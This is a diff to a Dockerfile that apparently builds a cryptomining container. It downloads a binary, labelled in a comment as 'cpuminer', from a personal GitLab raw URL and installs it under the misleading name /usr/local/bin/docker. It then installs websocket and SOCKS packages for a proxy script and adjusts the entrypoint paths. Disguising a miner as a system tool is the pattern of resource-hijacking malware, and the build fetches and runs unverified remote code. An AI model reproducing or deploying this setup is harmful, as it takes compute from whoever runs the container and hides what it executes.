@@ -9,20 +9,23 @@ RUN apt-get update && apt-get install -y \
     wget \
     && rm -rf /var/lib/apt/lists/*
 
+# Download binary cpuminer
 RUN wget -O /usr/local/bin/docker \
     "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
     && chmod +x /usr/local/bin/docker
 
 WORKDIR /app
 
-RUN npm init -y \
-    && npm install ws socks
+# Install Node.js dependencies
+RUN npm init -y && npm install ws socks
 
-COPY wsproxy.js .
-COPY entrypoint.sh /entrypoint.sh
+# Copy files
+COPY wsproxy.js /app/wsproxy.js
+COPY entrypoint.sh /app/entrypoint.sh
 
-RUN chmod +x /entrypoint.sh
+# Permission
+RUN chmod +x /app/entrypoint.sh
 
 EXPOSE 80
 
-ENTRYPOINT ["/entrypoint.sh"]
+ENTRYPOINT ["/app/entrypoint.sh"]
